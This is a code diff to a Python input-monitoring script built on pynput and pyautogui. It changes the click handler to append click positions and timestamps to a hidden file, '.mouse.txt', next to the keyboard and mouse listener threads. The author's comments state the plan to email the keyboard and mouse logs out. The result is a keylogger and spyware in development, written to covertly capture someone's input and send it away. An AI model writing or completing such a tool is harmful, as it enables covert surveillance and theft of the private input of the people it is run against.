@@ -34,8 +34,10 @@ def mouseMonitor():
 
 def clickcheck(x, y, button, pressed, injected):
     if pressed:
+        position = pyautogui.position()
         clocktime = datetime.datetime.now().strftime("%r")
-        print(f"{button}  X:{x}  Y:{y}  at {clocktime}")
+        with open('.mouse.txt', 'a') as file:
+            file.write(f"Click '{button}': {position.x}   Y:{position.y}  At {clocktime} \n")
     
 
 if __name__ == "__main__":
@@ -47,15 +49,13 @@ if __name__ == "__main__":
     keyboardThread.start()
     mouseThread.start()
 
-    with pynput.mouse.Listener(on_click=clickcheck) as listen:
+    with pynput.mouse.Listener(on_click=clickcheck) as clickread:
         keyboardThread.join()
         mouseThread.join()
-        listen.join()
+        clickread.join()
 
 
 
-# A new function is added to check the mouse click position and it is sucessfully working
-# Now using the snippets, get the mouse scroll options and implement it in the code and then get the keyboard and mouse logs via email
+# almost everything is perfect
 
-
-# DON'T FORGOT TO ADD THE TRY AND EXCEPT BLOCK FOR ERROR HANDLING AND RESOLVING
+# just check the final working condition, and don't forgot to add the function which can send the files and error hadnling logs to your email
